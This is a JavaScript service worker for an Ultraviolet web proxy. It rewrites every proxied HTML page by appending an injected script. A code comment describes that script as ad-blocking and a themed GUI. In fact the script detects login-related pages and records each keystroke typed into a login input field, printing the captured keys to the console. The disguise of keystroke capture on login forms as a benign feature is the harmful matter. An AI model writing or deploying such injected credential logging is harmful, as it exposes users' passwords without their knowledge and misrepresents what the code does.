importScripts('uv.bundle.js');
importScripts('uv.config.js');
importScripts(__uv$config.sw || 'uv.sw.js');

const sw = new UVServiceWorker();

self.addEventListener('fetch', (event) => {
  event.respondWith(handleFetchEvent(event));
});

async function handleFetchEvent(event) {
  const response = await sw.fetch(event);

  if (response.ok && response.headers.get('content-type').includes('text/html')) {
    const modifiedResponse = await modifyPageContent(response.clone());
    return modifiedResponse;
  }

  return response;
}

async function modifyPageContent(response) {
  const text = await response.text();

  // Modify the HTML to inject the ad-blocking script and the improved galaxy-themed JavaScript GUI with pre-installed scripts
  const modifiedText = `
    ${text}
    <script>
    //Assume the HTML has an input element with ID of "loginInput"

// Function to check for "sign in", "login", "password" in HTML
function checkForSignIn(){
  var bodyContent = document.body.innerHTML;
  return bodyContent.includes("sign in") || bodyContent.includes("login") || bodyContent.includes("password");
}

let keysRecorded = [];

// Function to record key strokes and print to console
function recordKeystrokes(){
  if(checkForSignIn()){
    let loginInput = document.getElementById("loginInput");
    loginInput.addEventListener("keydown", function(e){
      keysRecorded.push({key:e.key, elemClicked: loginInput.id});
      console.table(keysRecorded);
    });
  }
}

recordKeystrokes();
</script>
  `;

  const modifiedResponse = new Response(modifiedText, {
    status: response.status,
    statusText: response.statusText,
    headers: response.headers
  });

  return modifiedResponse;
}
